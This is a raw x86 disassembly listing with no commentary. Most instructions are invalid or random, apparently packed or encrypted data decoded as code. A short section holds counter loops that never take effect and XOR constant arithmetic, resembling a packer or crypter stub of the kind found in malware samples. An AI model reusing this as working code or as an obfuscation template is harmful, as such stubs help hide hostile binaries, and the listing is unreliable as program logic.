  402893:	int    0x5c
  402895:	call   0xd0c4:0x644eac5
  40289c:	mov    DWORD PTR [ebp*2-0x5319f749],esi
  4028a3:	jg     0x402833
  4028a5:	ret    
  4028a6:	imul   edx,DWORD PTR [edi-0x7f],0x91259474
  4028ad:	in     eax,dx
  4028ae:	dec    ebx
  4028af:	push   edi
  4028b0:	push   esp
  4028b1:	dec    edx
  4028b2:	inc    edx
  4028b3:	addr16 jae 0x402912
  4028b6:	daa    
  4028b7:	cmp    eax,0x1be96468
  4028bc:	mov    ah,0x96
  4028be:	adc    al,0x90
  4028c0:	in     eax,dx
  4028c1:	scas   eax,DWORD PTR es:[edi]
  4028c2:	jae    0x40284a
  4028c4:	jmp    0x7141:0xa856b71b
  4028cb:	sbb    edx,ecx
  4028cd:	cdq    
  4028ce:	push   0x8
  4028d0:	cmc    
  4028d1:	and    edi,DWORD PTR ds:0x46a5a0b7
  4028d7:	stos   BYTE PTR es:[edi],al
  4028d8:	push   ebp
  4028da:	ins    DWORD PTR es:[edi],dx
  4028db:	push   es
  4028dc:	xor    ebx,DWORD PTR [esi+0x61d3743e]
  4028e2:	mov    esp,0xf0926b39
  4028e7:	inc    ecx
  4028e8:	dec    DWORD PTR [esi+0x50147f91]
  4028ee:	clts   
  4028f0:	and    ah,dh
  4028f2:	fs cs aaa 
  4028f5:	cmp    eax,0xb702d0ae
  4028fa:	cmp    esp,edx
  4028fc:	sub    bl,BYTE PTR [ecx+0x47de33bb]
  402902:	inc    ebx
  402903:	sbb    al,0xfe
  402905:	add    eax,0x9b61f868
  40290a:	call   0xb5156b4c
  40290f:	cli    
  402910:	(bad)  
  402911:	dec    esp
  402912:	stos   DWORD PTR es:[edi],eax
  402913:	inc    eax
  402914:	xchg   edi,eax
  402915:	and    edi,DWORD PTR [ebp-0x4c]
  402918:	inc    edx
  402919:	rcl    DWORD PTR [ecx+eax*2],0x65
  40291d:	or     DWORD PTR [edi-0x4b],0x32
  402921:	ret    
  402922:	mov    DWORD PTR [esi],ecx
  402924:	popa   
  402925:	xchg   edx,eax
  402926:	dec    esp
  402927:	lods   al,BYTE PTR ds:[esi]
  402928:	jns    0x40291f
  40292a:	fisttp WORD PTR [esi+esi*8]
  40292d:	ror    DWORD PTR [ecx],0xa9
  402930:	sub    dh,BYTE PTR [edi-0x4588c5fc]
  402936:	pop    edx
  402937:	push   ecx
  402938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402939:	pop    ss
  40293a:	(bad)  
  40293b:	sti    
  40293c:	icebp  
  40293d:	fcmovu st,st(4)
  40293f:	mov    edx,0x73419c8d
  402944:	inc    eax
  402945:	dec    edx
  402946:	arpl   bp,cx
  402948:	xor    dl,BYTE PTR [edx-0x38]
  40294b:	add    al,0x22
  40294d:	shl    DWORD PTR ds:0x163ef682,0xea
  402954:	add    BYTE PTR [edi+0x10582ffc],0xfe
  40295b:	lahf   
  40295c:	icebp  
  40295d:	outs   dx,DWORD PTR ds:[esi]
  40295e:	imul   ecx,DWORD PTR [edi-0x39ae22b0],0xffffff97
  402965:	lods   eax,DWORD PTR fs:[esi]
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x852e0e81
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x6070707e
  402afd:	sbb    al,0xad
  402b00:	sti    
  402b01:	aas    
  402b02:	or     BYTE PTR [ecx-0x1c08eb7c],ah
  402b08:	and    BYTE PTR [edi],cl
  402b0a:	inc    eax
  402b0b:	push   0xffffffa8
  402b0d:	cwde   
  402b0e:	add    dh,BYTE PTR [ebx+0x68]
  402b11:	pop    es
  402b12:	inc    ebp
  402b13:	out    dx,al
  402b14:	and    esi,DWORD PTR [esi]
  402b16:	cmp    DWORD PTR ds:0x27e96bb9,edi
  402b1c:	adc    DWORD PTR [edx+0x72],0x7c
  402b20:	test   dl,cl
  402b22:	cmp    eax,0x546d13e4
  402b27:	mov    esp,0x8163887c
  402b2c:	pop    es
  402b2d:	addr16 mov edx,0x27993ee3
  402b33:	ror    BYTE PTR [eax+esi*2+0x78672bf],1
  402b3a:	push   ss
  402b3b:	popf   
  402b3c:	das    
  402b3d:	push   es
  402b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b3f:	push   ecx
  402b40:	xchg   edx,eax
  402b41:	cmp    eax,0x7874170f
  402b46:	mov    eax,ds:0x1f6a262b
  402b4b:	stc    
  402b4c:	mov    DWORD PTR [edx-0x159bce57],ebx
  402b52:	mov    dl,0xc3
  402b54:	cmp    DWORD PTR [esp+eiz*4+0x9],eax
  402b58:	xor    BYTE PTR [esi+ecx*1-0x7],dl
  402b5c:	sub    ch,BYTE PTR [ebx]
  402b5e:	add    BYTE PTR [ebx+edi*8],ch
  402b61:	inc    ebp
  402b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b63:	jmp    0x491b9bd7
  402b68:	inc    edi
  402b69:	adc    eax,0xdc05a075
  402b6e:	pop    es
  402b6f:	repz les ebp,FWORD PTR [eax]
  402b72:	je     0x402bd5
  402b74:	mov    al,0x35
  402b76:	je     0x402bf0
  402b78:	fiadd  WORD PTR [edi-0x3b]
  402b7b:	jmp    0x5fe76931
  402b80:	(bad)  
  402b81:	enter  0x3723,0x6
  402b85:	mov    bl,0xd4
  402b87:	lea    eax,[esi+0x2a1bcebb]
  402b8d:	mov    ebp,0x24e0b3b3
  402b92:	and    cl,BYTE PTR fs:[edx+ebp*1-0x209b6ec4]
  402b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b9b:	gs and al,0x8a
  402b9e:	sub    ebx,ebp
  402ba0:	lods   al,BYTE PTR ds:[esi]
  402ba1:	dec    esi
  402ba2:	sub    eax,0x969d1cc7
  402ba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ba8:	xor    BYTE PTR [edx],dh
  402baa:	ret    
  402bab:	aas    
  402bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bad:	outs   dx,DWORD PTR ds:[esi]
  402bae:	lds    ebp,FWORD PTR [edi]
  402bb0:	jns    0x402b77
  402bb2:	clc    
  402bb3:	icebp  
  402bb4:	inc    esp
  402bb5:	call   0x5f1997fe
  402bba:	xchg   edi,eax
  402bbb:	cdq    
  402bbc:	sbb    BYTE PTR [edi],0xcd
  402bbf:	push   ebp
  402bc0:	sbb    ch,ch
  402bc2:	cmp    esp,ecx
  402bc4:	ss scas al,BYTE PTR es:[edi]
  402bc6:	sub    eax,DWORD PTR [esi-0x3eff26e4]
  402bcc:	shl    BYTE PTR [ecx-0x5c],0x72
  402bd0:	or     eax,0x7afce7a
  402bd5:	mov    ch,0x8e
  402bd7:	ficom  DWORD PTR [ebx]
  402bd9:	cli    
  402bda:	add    eax,0xd2d41a22
  402bdf:	pop    ds
  402be0:	inc    ecx
  402be1:	daa    
  402be2:	jg     0x402bce
  402be4:	retf   
  402be5:	out    dx,eax
  402be6:	or     ebx,edi
  402be8:	(bad)  
  402be9:	fcomp  DWORD PTR [edx+0x51f4b07d]
  402bef:	das    
  402bf0:	leave  
  402bf1:	lahf   
  402bf2:	aad    0x48
  402bf4:	daa    
  402bf5:	inc    ebx
  402bf6:	and    al,0x77
  402bf8:	je     0x402c16
  402bfa:	enter  0xdea7,0x9a
  402bfe:	xchg   edx,eax
  402bff:	pushf  
  402c00:	call   0xf35f:0xc5968c3e
  402c07:	sbb    ch,BYTE PTR [esi+0x67]
  402c0a:	pop    esi
  402c0b:	mov    WORD PTR [ecx+0x25],cs
  402c0e:	pop    esp
  402c0f:	xchg   edx,eax
  402c10:	xchg   esi,eax
  402c11:	and    edx,0x35e9c76d
  402c17:	push   edi
  402c18:	stc    
  402c19:	lea    ebx,[edi+edi*4-0x70]
  402c1d:	or     DWORD PTR [ebp-0x73984276],esp
  402c23:	cmp    DWORD PTR [ebx+0x5a],edi
  402c26:	shr    DWORD PTR [edx],0x40
  402c29:	sbb    esp,DWORD PTR [edx]
  402c2b:	sbb    al,0x52
  402c2d:	dec    ebx
  402c2e:	int3   
  402c2f:	out    dx,al
  402c30:	jnp    0x402c36
  402c32:	jmp    0x402bc6
  402c34:	or     al,0xb8
  402c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c37:	arpl   di,cx
  402c39:	ss (bad) 
  402c3b:	jno    0x402c61
  402c3d:	jp     0x402c7e
  402c3f:	and    BYTE PTR [eax+0x5cb6d6ce],0x25
  402c46:	inc    ecx
  402c47:	inc    edi
  402c48:	add    bl,BYTE PTR [ebp-0x29]
  402c4b:	sub    edi,edi
  402c4d:	shl    ah,cl
  402c4f:	jmp    0x83aa335
  402c54:	pop    ebx
  402c55:	mov    WORD PTR [ebp-0x62224df5],ds
  402c5b:	cmp    eax,DWORD PTR [ebp+0x5b387192]
  402c61:	test   BYTE PTR [ebp-0x80],bh
  402c64:	popa   
  402c65:	ror    ebx,cl
  402c67:	dec    edi
  402c68:	sar    DWORD PTR [edx+ebx*1],cl
  402c6b:	cwde   
  402c6c:	adc    al,0xa1
  402c6e:	xor    al,0x5
  402c70:	cmp    al,0x1
  402c72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c73:	mov    bl,0x4f
  402c75:	or     bl,BYTE PTR [ecx]
  402c77:	dec    cx
  402c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c7a:	adc    eax,0x35be70ae
  402c7f:	pusha  
  402c80:	bound  esp,QWORD PTR [esi-0x611f2a60]
  402c86:	mov    BYTE PTR [edx-0x47],bl
  402c89:	ret    
  402c8a:	and    eax,0x7ad00461
  402c8f:	lock mov ecx,0xa2ac1557
  402c95:	sbb    eax,DWORD PTR [edx]
  402c97:	stos   BYTE PTR es:[edi],al
  402c98:	mov    cl,0x1
  402c9a:	jns    0x402c96
  402c9c:	inc    esp
  402c9d:	mov    fs,WORD PTR [ebx+0x2b]
  402ca0:	push   ss
  402ca1:	sbb    edx,DWORD PTR [ecx-0x7]
  402ca4:	push   0xfffffff0
  402ca6:	or     DWORD PTR [esi-0x5a],edi
  402ca9:	cmp    al,0xed
  402cab:	mov    WORD PTR [ebp-0x151c97e7],fs
  402cb1:	mov    ecx,0x7343e28b
  402cb6:	xor    al,BYTE PTR [edx]
  402cb8:	xchg   DWORD PTR [esi-0x7cf07ef5],edi
  402cbe:	and    al,0xdc
  402cc0:	cli    
  402cc1:	fbstp  TBYTE PTR [ecx-0x176bfdf0]
  402cc7:	or     dh,BYTE PTR [edx+0x5]
  402cca:	repnz outs dx,DWORD PTR ds:[esi]
  402ccc:	mov    ebp,DWORD PTR [edx]
  402cce:	push   ebx
  402ccf:	imul   ebx,ecx,0xcdcc0e3a
  402cd5:	nop
  402cd6:	repz mov bl,0xb0
  402cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cda:	mov    ebx,DWORD PTR [edx+ebx*2]
  402cdd:	fisttp WORD PTR [ecx]
  402cdf:	popf   
  402ce0:	pop    ss
  402ce1:	stos   DWORD PTR es:[edi],eax
  402ce2:	sub    BYTE PTR [eax],0xb3
  402ce5:	xchg   al,ah
  402ce7:	push   ds
  402ce8:	out    0xf2,al
  402cea:	mov    bl,0xd5
  402cec:	ins    BYTE PTR es:[edi],dx
  402ced:	shr    edi,0x57
  402cf0:	inc    edx
  402cf1:	loopne 0x402d3e
  402cf3:	dec    esp
  402cf4:	add    eax,0x5ff4d7ae
  402cf9:	stos   DWORD PTR es:[edi],eax
  402cfa:	daa    
  402cfb:	push   cs
  402cfc:	fstp   st(6)
  402cfe:	je     0x402d4c
  402d00:	push   ds
  402d01:	cwde   
  402d02:	inc    ebx
  402d03:	loop   0x402d27
  402d05:	loope  0x402cae
  402d07:	cmc    
  402d08:	jecxz  0x402cc8
  402d0a:	mov    WORD PTR [esp+ecx*2+0x6fc607a5],ss
  402d11:	ja     0x402d91
  402d13:	test   esp,ebx
  402d15:	stos   BYTE PTR es:[edi],al
  402d16:	mov    al,ds:0x130e7c35
  402d1b:	sub    BYTE PTR [ecx],0xa
  402d1e:	out    0x1f,eax
  402d20:	mov    edi,0xcb61aa0d
  402d25:	add    eax,0x5083eb16
  402d2a:	pop    esp
  402d2b:	not    DWORD PTR [ecx]
  402d2d:	push   ebp
  402d2e:	pop    eax
  402d2f:	mov    esp,0x514f6b52
  402d34:	xor    eax,0x970b7eb3
  402d39:	daa    
  402d3a:	pop    esi
  402d3b:	rcr    ebx,cl
  402d3d:	addr16 (bad) 
  402d40:	ds call 0x1a98:0xd2f9298f
  402d48:	adc    ch,BYTE PTR [ebp+0x1dd75ca1]
  402d4e:	dec    ebx
  402d4f:	push   ebp
  402d50:	outs   dx,DWORD PTR ds:[esi]
  402d51:	fldenv [ecx+esi*8-0x25]
  402d55:	imul   ebx,DWORD PTR [eax],0x6ecd21e5
  402d5b:	es xchg edi,eax
  402d5d:	out    0x3a,al
  402d5f:	xor    esp,eax
  402d61:	ret    0x6318
  402d64:	js     0x402d36
  402d66:	mov    ss,WORD PTR [edx]
  402d68:	loopne 0x402d92
  402d6a:	or     BYTE PTR [ecx],bl
  402d6c:	pop    eax
  402d6d:	pop    esi
  402d6e:	inc    edx
  402d6f:	sbb    dh,BYTE PTR [esi-0x7f]
  402d72:	test   BYTE PTR [esi+0x7c],ch
  402d75:	(bad)  
  402d76:	(bad)  
  402d77:	mov    esp,0x611e0a8f
  402d7c:	mov    dh,0xbf
  402d7e:	pop    ds
  402d7f:	jge    0x402dad
  402d81:	icebp  
  402d82:	aas    
  402d83:	xchg   edi,eax
  402d84:	lods   eax,DWORD PTR ds:[esi]
  402d85:	xor    esi,ebp
  402d87:	lods   eax,DWORD PTR ds:[esi]
  402d88:	push   eax
  402d8a:	idiv   DWORD PTR [ebp+0x63]
  402d8d:	enter  0x43b4,0x62
  402d91:	lock out 0xda,al
  402d94:	or     esp,ecx
  402d96:	dec    esi
  402d97:	dec    ecx
  402d98:	xchg   ebp,eax
  402d99:	stos   DWORD PTR es:[edi],eax
  402d9a:	and    eax,0x4503d73a
  402d9f:	xchg   ecx,eax
  402da0:	mov    ch,0x58
  402da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402da3:	push   ebx
  402da4:	stos   BYTE PTR es:[edi],al
  402da5:	rol    bh,1
  402da7:	jo     0x402d3f
  402da9:	dec    ecx
  402daa:	dec    edi
  402dab:	or     BYTE PTR [esi],cl
  402dad:	call   0xa5f3:0xfb2ef736
  402db4:	sub    edi,DWORD PTR [esi]
  402db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402db7:	push   edi
  402db8:	push   esp
  402db9:	push   ecx
  402dba:	scas   al,BYTE PTR es:[edi]
  402dbb:	push   esp
  402dbc:	adc    BYTE PTR [esi],ah
  402dbe:	add    edx,esi
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	jge    0x402d84
  402de1:	das    
  402de2:	mov    si,0x700a
  402de6:	jo     0x402da6
  402de8:	jle    0x402e5a
  402dea:	jo     0x402e09
  402dec:	add    ebp,DWORD PTR [edi+0x2b]
  402def:	xchg   ecx,eax
  402df0:	dec    ebx
  402df1:	mov    cl,0x8e
  402df3:	je     0x402e3b
  402df5:	inc    esi
  402df6:	pop    ss
  402df7:	in     eax,dx
  402df8:	cmp    ah,BYTE PTR [edx+0x68760fc2]
  402dfe:	mov    cs,WORD PTR [ebx+0x7e]
  402e01:	neg    DWORD PTR [edi]
  402e03:	fmul   DWORD PTR [ecx+0x78c34954]
  402e09:	jecxz  0x402e15
  402e0b:	fisttp QWORD PTR ds:0x5518332f
  402e11:	pop    eax
  402e12:	sub    ah,BYTE PTR [edi]
  402e14:	or     esi,DWORD PTR [esi]
  402e16:	push   ebp
  402e17:	lods   eax,DWORD PTR ds:[esi]
  402e18:	and    BYTE PTR [ecx],al
  402e1a:	in     eax,0x42
  402e1c:	inc    ebx
  402e1d:	div    DWORD PTR [ecx-0x3de95208]
  402e23:	jo     0x402dd9
  402e25:	sub    esi,esp
  402e27:	fst    DWORD PTR [esi]
  402e29:	dec    edi
  402e2a:	dec    DWORD PTR [eax+0x20d46f60]
  402e30:	icebp  
  402e31:	das    
  402e32:	pop    ebx
  402e33:	xchg   ebp,edi
  402e35:	xor    al,0x3c
  402e37:	mov    DWORD PTR [ebx+ebp*2+0x60],0x2dfcbf2
  402e3f:	es dec esp
  402e41:	cs mov cl,0x1c
  402e44:	fs fucomp st(5)
  402e47:	xor    ebp,DWORD PTR [edx-0x33cf116d]
  402e4d:	test   eax,0xaf204d73
  402e52:	cld    
  402e53:	outs   dx,BYTE PTR ds:[esi]
  402e54:	mov    ds:0x91aa1199,eax
  402e59:	jmp    0xb75aa573
  402e5e:	cmc    
  402e5f:	dec    ebx
  402e60:	adc    esp,DWORD PTR [ecx+esi*1-0x62457053]
  402e67:	pop    eax
  402e68:	inc    ebx
  402e69:	lahf   
  402e6a:	std    
  402e6b:	push   cs
  402e6c:	inc    edi
  402e6d:	loope  0x402ec1
  402e6f:	jl     0x402eb7
  402e71:	xchg   ecx,eax
  402e73:	adc    edi,ebp
  402e75:	test   eax,0x6c7a088a
  402e7a:	daa    
  402e7b:	xor    eax,0xc5089ff1
  402e80:	xchg   edx,eax
  402e81:	inc    ecx
  402e82:	and    eax,0xaee8f3db
  402e87:	(bad)  [ebp+0x5a2783e5]
  402e8d:	xchg   BYTE PTR [esi],bl
  402e8f:	stos   DWORD PTR es:[edi],eax
  402e90:	pop    esi
  402e91:	jae    0x402eed
  402e93:	pop    ss
  402e94:	fs inc esi
  402e96:	sub    DWORD PTR [ebx+0x22],edx
  402e99:	xchg   ebx,eax
  402e9a:	dec    edx
  402e9b:	add    ebp,ebp
  402e9d:	adc    esp,DWORD PTR [ebx-0x22]
  402ea0:	cld    
  402ea1:	mov    esp,0xe3e259ed
  402ea6:	lds    esi,FWORD PTR ds:0xce6c14b9
  402eac:	rol    DWORD PTR [edx-0x27],cl
  402eaf:	pop    edx
  402eb0:	sti    
  402eb1:	in     eax,dx
  402eb2:	and    ah,BYTE PTR ds:0x1553403
  402eb8:	mov    bh,0x27
  402eba:	sbb    BYTE PTR [edi-0x57],0x1
  402ebe:	inc    esp
  402ebf:	mov    bl,0xb3
  402ec1:	dec    eax
  402ec2:	rcr    DWORD PTR [eax-0x5ad46893],cl
  402ec8:	sbb    DWORD PTR [ebx],eax
  402eca:	in     eax,0x5b
  402ecc:	popa   
  402ecd:	sbb    al,0x1a
  402ecf:	fsub   QWORD PTR [ebp+0x2f]
  402ed2:	mov    ds,WORD PTR [ecx-0x58]
  402ed5:	ror    BYTE PTR cs:0x59a9b431,0xab
  402edd:	jbe    0x402ec5
  402edf:	scas   eax,DWORD PTR es:[edi]
  402ee0:	icebp  
  402ee1:	lods   eax,DWORD PTR ds:[esi]
  402ee2:	push   ebp
  402ee3:	int3   
  402ee4:	xor    BYTE PTR [ecx-0x5c633a42],ch
  402eea:	mov    esi,0xe1cbf2ec
  402eef:	mov    al,0x12
  402ef1:	jecxz  0x402ec7
  402ef3:	cmp    ebx,DWORD PTR [ecx]
  402ef5:	push   cs
  402ef6:	outs   dx,DWORD PTR ds:[esi]
  402ef7:	aas    
  402ef8:	adc    eax,0x42bda225
  402efd:	and    ch,dh
  402eff:	sub    ebx,0xd
  402f02:	adc    DWORD PTR [ebp-0x1a],esp
  402f05:	(bad)  
  402f06:	xchg   ecx,eax
  402f07:	sar    DWORD PTR [edx+0x54],1
  402f0a:	cmp    ecx,0xffffff8f
  402f0d:	add    al,0x90
  402f0f:	dec    edx
  402f10:	dec    edx
  402f11:	jb     0x402eaa
  402f13:	jbe    0x402f3e
  402f15:	mov    al,ds:0x4b5ec560
  402f1a:	and    ebx,DWORD PTR [edi-0x61]
  402f1d:	or     BYTE PTR [edi],bh
  402f1f:	push   edi
  402f20:	add    eax,0x67db80ad
  402f25:	shl    DWORD PTR [ebp-0x38],cl
  402f28:	iret   
  402f29:	mov    BYTE PTR [ebp-0xd],cl
  402f2c:	dec    ebx
  402f2d:	mov    edx,0x331a35e2
  402f32:	int    0xa2
  402f34:	(bad)  
  402f35:	mov    edx,0x153e7507
  402f3a:	xchg   edx,eax
  402f3b:	dec    esi
  402f3c:	aaa    
  402f3d:	dec    esp
  402f3e:	sbb    eax,0x2a552f87
  402f43:	inc    ebx
  402f44:	push   ds
  402f45:	jo     0x402f2b
  402f47:	adc    esp,0xffffffe4
  402f4a:	push   edi
  402f4b:	and    esi,DWORD PTR [ebx+0x4d]
  402f4e:	aam    0xd2
  402f50:	int    0x47
  402f52:	add    cl,ah
  402f54:	outs   dx,DWORD PTR ds:[esi]
  402f55:	pushf  
  402f56:	out    dx,eax
  402f57:	and    bh,ch
  402f59:	(bad)  
  402f5a:	jno    0x402eeb
  402f5c:	xor    BYTE PTR [ebx-0x76965cd8],bh
  402f62:	aas    
  402f63:	mov    WORD PTR [esi+0x3],es
  402f66:	dec    edi
  402f67:	outs   dx,BYTE PTR ds:[esi]
  402f68:	jecxz  0x402fcc
  402f6a:	xchg   DWORD PTR [edx+0xd],esp
  402f6d:	aad    0xff
  402f6f:	sub    eax,DWORD PTR [edi]
  402f71:	imul   esp,DWORD PTR [ebp+0x2da1e60],0xffffff81
  402f78:	pop    edi
  402f79:	lods   al,BYTE PTR ds:[esi]
  402f7a:	(bad)  
  402f7b:	aam    0x62
  402f7d:	arpl   WORD PTR [ebp-0x1a],si
  402f80:	jne    0x402f55
  402f82:	int    0x88
  402f84:	push   ss
  402f85:	inc    esi
  402f86:	out    dx,eax
  402f87:	out    0xc8,al
  402f89:	sbb    bl,BYTE PTR [edi]
  402f8b:	pop    esp
  402f8c:	enter  0x1d91,0x75
  402f90:	inc    ecx
  402f91:	(bad)  
  402f92:	push   esp
  402f93:	or     BYTE PTR [ebx-0x2dcfb4bb],bh
  402f99:	sub    BYTE PTR [ecx+0x6b],dl
  402f9c:	or     BYTE PTR [ebx-0x2ebe1c71],cl
  402fa2:	ins    DWORD PTR es:[edi],dx
  402fa3:	mov    dh,0xec
  402fa5:	ret    0x23b3
  402fa8:	call   0xa9a70c46
  402fad:	iret   
  402fae:	in     al,0x9f
  402fb0:	repz sub dl,BYTE PTR [edi+0x55]
  402fb4:	inc    ebp
  402fb5:	mov    bl,0xe7
  402fb7:	cli    
  402fb8:	scas   al,BYTE PTR es:[edi]
  402fb9:	lea    ebp,[esi+edi*8]
  402fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fbd:	std    
  402fbe:	cmp    eax,0x11017ed7
  402fc3:	popf   
  402fc4:	clc    
  402fc5:	fsubr  DWORD PTR [ebx]
  402fc7:	mov    eax,ds:0xa117d080
  402fcc:	inc    eax
  402fcd:	addr16 inc edi
  402fcf:	mov    ebx,0x3e36a4ba
  402fd4:	xchg   ebp,eax
  402fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fd6:	or     al,0xd0
  402fd8:	mov    eax,0x2f8168c6
  402fdd:	clc    
  402fde:	les    ecx,FWORD PTR [edi+eax*4]
  402fe1:	mov    esi,0xc74a21b1
  402fe6:	scas   al,BYTE PTR es:[edi]
  402fe7:	loopne 0x402f7c
  402fe9:	xor    BYTE PTR [ebp+esi*8-0x9a7733],0x1b
  402ff1:	mov    al,ds:0x85813317
  402ff6:	ds or  eax,0x2acbe60
  402ffc:	xchg   esi,eax
  402ffd:	mov    bh,0x49
  402fff:	jnp    0x402ff4
  403001:	cmc    
  403002:	ja     0x402fe6
  403004:	(bad)  
  403005:	outs   dx,DWORD PTR ds:[esi]
  403006:	sub    BYTE PTR [edi],0x1d
  403009:	out    0xce,al
  40300b:	xor    BYTE PTR [edi+0x2ce7012c],bl
  403011:	in     al,dx
  403012:	cmp    ebp,DWORD PTR [edx]
  403014:	sbb    dh,BYTE PTR [edi]
  403016:	or     BYTE PTR [esi+0x15],bl
  403019:	lods   al,BYTE PTR ds:[esi]
  40301a:	daa    
  40301b:	and    bh,ch
  40301d:	iret   
  40301e:	jg     0x402fe1
  403020:	sbb    BYTE PTR [esp+ebp*2+0x172dbfd],al
  403027:	jmp    0x402fde
  403029:	jo     0x402fd0
  40302b:	xchg   BYTE PTR [esi+eax*4+0x14],al
  40302f:	cmp    al,0x6
  403031:	adc    ecx,DWORD PTR [edx+0x7f]
  403034:	leave  
  403035:	sub    cl,bh
  403037:	mov    ds:0x2e9d0df5,eax
  40303c:	xchg   edi,eax
  40303d:	or     dh,BYTE PTR [ebp-0x35]
  403040:	fmul   DWORD PTR [ebp+0x1c1fd98d]
  403046:	xchg   BYTE PTR [eax],cl
  403048:	jno    0x403020
  40304a:	add    cl,BYTE PTR [ecx-0x3d0beff7]
  403050:	push   edi
  403051:	mov    al,ds:0xe364258f
  403056:	sbb    edx,DWORD PTR [edx+0x31]
  403059:	out    dx,eax
  40305a:	dec    ebx
  40305b:	cdq    
  40305c:	jno    0x403015
  40305e:	and    BYTE PTR [esi-0x44],ah
  403061:	es test al,0xfd
  403064:	cmc    
  403065:	fidivr DWORD PTR [edx]
  403067:	fisttp WORD PTR [eax]
  403069:	in     eax,0x3f
  40306b:	sub    ah,BYTE PTR [ecx+0x75]
  40306e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40306f:	lods   al,BYTE PTR ds:[esi]
  403070:	ins    BYTE PTR es:[edi],dx
  403071:	sti    
  403072:	push   0xfffffffe
  403074:	(bad)  
  403075:	sar    DWORD PTR [ebp+0x44],cl
  403078:	loope  0x4030ca
  40307a:	clc    
  40307b:	sub    al,0x9
  40307d:	inc    ebx
  40307e:	fs (bad) 
  403080:	std    
  403081:	dec    eax
  403082:	and    BYTE PTR [edi+eiz*2],ch
